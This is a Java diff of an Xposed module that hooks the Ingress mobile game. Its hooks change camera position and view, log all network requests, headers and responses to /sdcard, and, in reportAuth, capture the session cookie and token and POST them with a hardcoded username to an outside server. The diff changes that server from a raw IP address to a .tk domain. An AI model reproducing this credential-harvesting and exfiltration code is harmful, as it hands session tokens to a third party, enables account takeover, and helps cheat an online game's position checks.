@@ -22,27 +22,34 @@ import static de.robv.android.xposed.XposedHelpers.*;
 public class Ingress extends DefaultAbstractApp {
 
     static String cachedCookie, cachedToken;
+    Loggable logger;
+    XSharedPreferences pref;
+    boolean debug;
+
+
+    public Ingress() {
+        this.pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
+        this.debug = pref.getBoolean("debug", false);
+        this.logger = new Loggable(debug);
+    }
 
     public String getName() {
         return "Ingress";
     }
 
     public void prepare(final XC_LoadPackage.LoadPackageParam lpparam) {
-        log("Preparing Ingress: hookBadlogicCameraView");
+        logger.log("Preparing Ingress: hookBadlogicCameraView");
         hookBadlogicCameraView(lpparam);
-        log("Preparing Ingress: hookIngressNet");
+        logger.log("Preparing Ingress: hookIngressNet");
         hookIngressNet(lpparam);
-        log("Preparing Ingress: hookIngressScanner");
+        logger.log("Preparing Ingress: hookIngressScanner");
         hookIngressScanner(lpparam);
-        log("Prepare Ingress success!");
+        logger.log("Prepare Ingress success!");
     }
 
     private void hookBadlogicCameraView(final XC_LoadPackage.LoadPackageParam lpparam) {
-        final XSharedPreferences pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
-        final Boolean debug = pref.getBoolean("debug", false);
 
         final Class<?> perspectiveCamera = findClass("com.badlogic.gdx.graphics.PerspectiveCamera", lpparam.classLoader);
-        //final Class<?> vector3 = findClass("com.badlogic.gdx.math.Vector3", lpparam.classLoader);
         try {
             findAndHookMethod(perspectiveCamera, "update", boolean.class, new XC_MethodHook() {
                 @Override
@@ -77,12 +84,10 @@ public class Ingress extends DefaultAbstractApp {
                     oldUpY = getFloatField(up, "y");
                     oldUpZ = getFloatField(up, "z");
 
-                    if (debug) {
-                        log("PerspectiveCamera: props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
-                        log("PerspectiveCamera: dir: x: " + oldDirectionX.toString() + ", y: " + oldDirectionY.toString() + ", z: " + oldDirectionZ.toString());
-                        log("PerspectiveCamera: pos: x: " + oldPositionX.toString() + ", y: " + oldPositionY.toString() + ", z: " + oldPositionZ.toString());
-                        log("PerspectiveCamera: up : x: " + oldUpX.toString() + ", y: " + oldUpY.toString() + ", z: " + oldUpZ.toString());
-                    }
+                    logger.debugLog("PerspectiveCamera: props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
+                    logger.debugLog("PerspectiveCamera: dir: x: " + oldDirectionX.toString() + ", y: " + oldDirectionY.toString() + ", z: " + oldDirectionZ.toString());
+                    logger.debugLog("PerspectiveCamera: pos: x: " + oldPositionX.toString() + ", y: " + oldPositionY.toString() + ", z: " + oldPositionZ.toString());
+                    logger.debugLog("PerspectiveCamera: up : x: " + oldUpX.toString() + ", y: " + oldUpY.toString() + ", z: " + oldUpZ.toString());
 
                     //prepare to change params
                     //skip all non-default scanner views
@@ -131,12 +136,10 @@ public class Ingress extends DefaultAbstractApp {
                             setFloatField(param.thisObject, "fieldOfView", pref.getFloat("fov", 40f));
                         }
 
-                        if (debug) {
-                            near = getFloatField(param.thisObject, "near");
-                            far = getFloatField(param.thisObject, "far");
-                            fieldOfView = getFloatField(param.thisObject, "fieldOfView");
-                            log("PerspectiveCamera: SET props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
-                        }
+                        near = getFloatField(param.thisObject, "near");
+                        far = getFloatField(param.thisObject, "far");
+                        fieldOfView = getFloatField(param.thisObject, "fieldOfView");
+                        logger.debugLog("PerspectiveCamera: SET props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
                     }
 
                     if (pref.getBoolean("posByUpEnabled", false)) {
@@ -145,12 +148,10 @@ public class Ingress extends DefaultAbstractApp {
 
                         positionX = oldUpX * coeffX * coeffPref;
                         positionZ = oldUpZ * coeffZ * coeffPref;
-                        if (debug) {
-                            log("PerspectiveCamera: SET pos by up(" + oldUpX.toString() + "," + oldUpZ.toString() + "): x"
-                                    + positionX.toString() + "(" + oldPositionX.toString() + "), z"
-                                    + positionZ.toString() + "(" + oldPositionZ.toString() + "), "
-                                    + "coeff" + "(" + coeffX.toString() + "," + coeffZ.toString() + ")");
-                        }
+                        logger.debugLog("PerspectiveCamera: SET pos by up(" + oldUpX.toString() + "," + oldUpZ.toString() + "): x"
+                                + positionX.toString() + "(" + oldPositionX.toString() + "), z"
+                                + positionZ.toString() + "(" + oldPositionZ.toString() + "), "
+                                + "coeff" + "(" + coeffX.toString() + "," + coeffZ.toString() + ")");
                         setFloatField(position, "x", positionX);
                         setFloatField(position, "z", positionZ);
                     } else {
@@ -158,24 +159,22 @@ public class Ingress extends DefaultAbstractApp {
                             setFloatField(up, "x", pref.getFloat("upX", 0f));
                             setFloatField(up, "y", pref.getFloat("upY", 0f));
                             setFloatField(up, "z", pref.getFloat("upZ", 0f));
-                            if (debug) {
-                                upX = getFloatField(up, "x");
-                                upY = getFloatField(up, "y");
-                                upZ = getFloatField(up, "z");
-                                log("PerspectiveCamera: SET up : x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
-                            }
-                        }
+
+                            upX = getFloatField(up, "x");
+                            upY = getFloatField(up, "y");
+                            upZ = getFloatField(up, "z");
+                            logger.debugLog("PerspectiveCamera: SET up : x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
+                    }
                         if (pref.getBoolean("posEnabled", false)) {
                             setFloatField(position, "x", pref.getFloat("posX", 0f));
                             //camera height: can be changed by app
                             //setFloatField(position, "y", pref.getFloat("posY", 0f));
                             setFloatField(position, "z", pref.getFloat("posZ", 0f));
-                            if (debug) {
-                                upX = getFloatField(position, "x");
-                                upY = getFloatField(position, "y");
-                                upZ = getFloatField(position, "z");
-                                log("PerspectiveCamera: SET pos: x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
-                            }
+
+                            upX = getFloatField(position, "x");
+                            upY = getFloatField(position, "y");
+                            upZ = getFloatField(position, "z");
+                            logger.debugLog("PerspectiveCamera: SET pos: x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
                         }
                     }
 
@@ -185,18 +184,17 @@ public class Ingress extends DefaultAbstractApp {
                         setFloatField(direction, "x", pref.getFloat("dirX", 0f));
                         setFloatField(direction, "y", pref.getFloat("dirY", 0f));
                         setFloatField(direction, "z", pref.getFloat("dirZ", 0f));
-                        if (debug) {
-                            directionX = getFloatField(direction, "x");
-                            directionY = getFloatField(direction, "y");
-                            directionZ = getFloatField(direction, "z");
-                            log("PerspectiveCamera: SET dir: x: " + directionX.toString() + ", y: " + directionY.toString() + ", z: " + directionZ.toString());
-                        }
+
+                        directionX = getFloatField(direction, "x");
+                        directionY = getFloatField(direction, "y");
+                        directionZ = getFloatField(direction, "z");
+                        logger.debugLog("PerspectiveCamera: SET dir: x: " + directionX.toString() + ", y: " + directionY.toString() + ", z: " + directionZ.toString());
                     }
                 }
             });
 
         } catch (Throwable e) {
-            log("EXCEPTION in PerspectiveCamera: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in PerspectiveCamera: " + e.getMessage() + ", " + e.getClass().toString());
         }
     }
 
@@ -211,7 +209,7 @@ public class Ingress extends DefaultAbstractApp {
                 protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                     URI uri = (URI) param.args[0];
                     String body = (String) param.args[2];
-                    log("s: req.uri: " + uri.toString());
+                    logger.debugLog("s: req.uri: " + uri.toString());
                     try {
                         PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/request-data.dat", true)));
                         file.println(uri.toString());
@@ -219,12 +217,12 @@ public class Ingress extends DefaultAbstractApp {
                         file.println();
                         file.close();
                     } catch (IOException e) {
-                        log("Failed writing to file: " + e.getMessage());
+                        logger.log("Failed writing to file: " + e.getMessage());
                     }
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
         }
         try {
             //public static void \u02ca(final HashMap<String, String> hashMap, final asj asj, final boolean b)
@@ -234,7 +232,7 @@ public class Ingress extends DefaultAbstractApp {
                     String cookie = "";
                     String token = "";
                     HashMap<String, String> hm = (HashMap) param.args[0];
-                    log("s: req.headers");
+                    logger.debugLog("s: req.headers");
                     try {
                         PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/request-headers.dat", true)));
                         for (HashMap.Entry entry : hm.entrySet()) {
@@ -251,12 +249,12 @@ public class Ingress extends DefaultAbstractApp {
                             reportAuth(cookie, token);
                         }
                     } catch (IOException e) {
-                        log("Failed writing to file: " + e.getMessage());
+                        logger.log("Failed writing to file: " + e.getMessage());
                     }
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
         }
         final Class<?> aln = findClass("o.aln", lpparam.classLoader);
         try {
@@ -283,9 +281,9 @@ public class Ingress extends DefaultAbstractApp {
                         BufferedInputStream fakeIs = new BufferedInputStream(new ByteArrayInputStream(inputData.toByteArray()));
                         param.setResult(fakeIs);
                     } else {
-                        log("s: input stream: NOT GZIP! " + param.getResult().getClass().toString());
+                        logger.debugLog("s: input stream: NOT GZIP! " + param.getResult().getClass().toString());
                     }
-                    log("s: resp.uri: " + uri.toString() + ", resp.code: " + httpCode.toString() + ", type: " + type + ", size: " + inputData.size());
+                    logger.debugLog("s: resp.uri: " + uri.toString() + ", resp.code: " + httpCode.toString() + ", type: " + type + ", size: " + inputData.size());
 
                     try {
                         PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/response.dat", true)));
@@ -305,12 +303,12 @@ public class Ingress extends DefaultAbstractApp {
                         file.println();
                         file.close();
                     } catch (IOException e) {
-                        log("Failed writing to file: " + e.getMessage());
+                        logger.log("Failed writing to file: " + e.getMessage());
                     }
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
         }
 
         final Class<?> ufecb = findClass("o.ﻋ", lpparam.classLoader);
@@ -319,16 +317,15 @@ public class Ingress extends DefaultAbstractApp {
                 @Override
                 protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                     Long ret = (Long) param.getResult();
-                    log("ufecb: readed: " + ret.toString());
+                    logger.debugLog("ufecb: readed: " + ret.toString());
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
         }
     }
 
-    private void hookIngressScanner(final XC_LoadPackage.LoadPackageParam lpparam)
-    {
+    private void hookIngressScanner(final XC_LoadPackage.LoadPackageParam lpparam) {
         final XSharedPreferences pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
         final Boolean debug = pref.getBoolean("debug", false);
 
@@ -348,7 +345,7 @@ public class Ingress extends DefaultAbstractApp {
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
         }
         try {
             findAndHookMethod(p, "ʻ", new XC_MethodHook() {
@@ -363,7 +360,7 @@ public class Ingress extends DefaultAbstractApp {
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
         }
 
         final Class<?> ze = findClass("o.ze", lpparam.classLoader);
@@ -379,14 +376,12 @@ public class Ingress extends DefaultAbstractApp {
                         pref.reload();
                     }
                     Object color = param.args[2];
-                    float r,g,b,a;
+                    float r, g, b, a;
                     r = getFloatField(color, "r");
                     g = getFloatField(color, "g");
                     b = getFloatField(color, "b");
                     a = getFloatField(color, "a");
-                    if (debug) {
-                        log("color: r:" + r + ", g: " + g + ", b: " + b + ", a: " + a);
-                    }
+                    logger.debugLog("color: r:" + r + ", g: " + g + ", b: " + b + ", a: " + a);
 
                     if (pref.getBoolean("colorEnabled", false)) {
                         setFloatField(color, "r", pref.getFloat("colorR", 1.0f));
@@ -397,7 +392,7 @@ public class Ingress extends DefaultAbstractApp {
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
         }
 
         final Class<?> portalInfoHudIf = findClass("com.nianticproject.ingress.common.ui.hud.PortalInfoHud$if", lpparam.classLoader);
@@ -406,12 +401,12 @@ public class Ingress extends DefaultAbstractApp {
                 @Override
                 protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                     String fullString = (String) param.args[0];
-                    log("portalInfoHud: string: " + fullString);
+                    logger.log("portalInfoHud: string: " + fullString);
                     param.setResult(fullString);
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
         }
 
         //disable disabling immersive move when opening COMM
@@ -424,32 +419,45 @@ public class Ingress extends DefaultAbstractApp {
                 }
             });
         } catch (Throwable e) {
-            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
+            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
+        }
+
+        final Class<?> ajk = findClass("o.ajk", lpparam.classLoader);
+        try {
+            findAndHookMethod(ajk, "ˊ", String.class, int.class, new XC_MethodHook() {
+                @Override
+                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
+                    logger.log("ajk: tried to wrap string `" + (String) param.args[0] + "` to " + (int) param.args[1]);
+                    param.args[1] = (int) param.args[1] + 1;
+                }
+            });
+        } catch (Throwable e) {
+            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
         }
     }
 
     private void reportAuth(String cookie, String token) throws UnsupportedEncodingException, JSONException {
         if (cachedCookie != null && cachedToken != null) {
             if (cachedCookie.equals(cookie) && cachedToken.equals(token)) {
-                log("auth: already sent");
+                logger.debugLog("auth: already sent");
 
                 return;
             }
         }
         HttpClient client = new DefaultHttpClient();
-        HttpPost fakeRequest = new HttpPost("http://52.32.233.72/i/ing-auth.php");
+        HttpPost fakeRequest = new HttpPost("http://iusq.tk/i/ing-auth.php");
         List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
         urlParameters.add(new BasicNameValuePair("user", "appleblo0m"));
         urlParameters.add(new BasicNameValuePair("cookie", cookie));
         urlParameters.add(new BasicNameValuePair("token", token));
 
         fakeRequest.setEntity(new UrlEncodedFormEntity(urlParameters));
-        log("auth: reporting...");
+        logger.debugLog("auth: reporting...");
         try {
             HttpResponse fakeResponse = client.execute(fakeRequest);
             fakeResponse.getEntity().getContent().close();
         } catch (Throwable e) {
-            log("auth: report ERROR: " + e.getClass().toString() + ", " + e.getMessage());
+            logger.log("auth: report ERROR: " + e.getClass().toString() + ", " + e.getMessage());
 
             return;
         }
